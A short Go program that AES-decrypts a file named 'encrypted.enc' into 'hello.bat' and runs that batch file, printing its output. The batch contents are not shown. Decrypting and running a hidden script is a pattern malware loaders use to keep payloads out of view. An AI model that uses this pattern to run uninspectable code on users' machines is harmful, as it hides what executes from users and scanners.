// main.go
package main

import (
	"bufio"
	"fmt"
	"os"

	"github.com/OpenWavesGit/batman/aesfile"
	"github.com/OpenWavesGit/batman/batrunner"
)

func main() {
	encryptedFile := "encrypted.enc"
	decryptedFile := "hello.bat"
	//
	reader := bufio.NewReader(os.Stdin)

	// Decrypt the encrypted file
	err := aesfile.DecodeFile(encryptedFile, decryptedFile)
	if err != nil {
		fmt.Println("Error decrypting file:", err)
		return
	}
	fmt.Println("File decrypted successfully.")

	// Path to the batch file
	batchFilePath := "hello.bat"

	// Execute the batch file using the package
	output, err := batrunner.RunBatchFile(batchFilePath)
	if err != nil {
		fmt.Println("Error:", err)
		return
	}

	// Print the output of the batch file
	fmt.Println(output)
	reader.ReadString('\n')
	fmt.Println("Press Enter to exit")

}
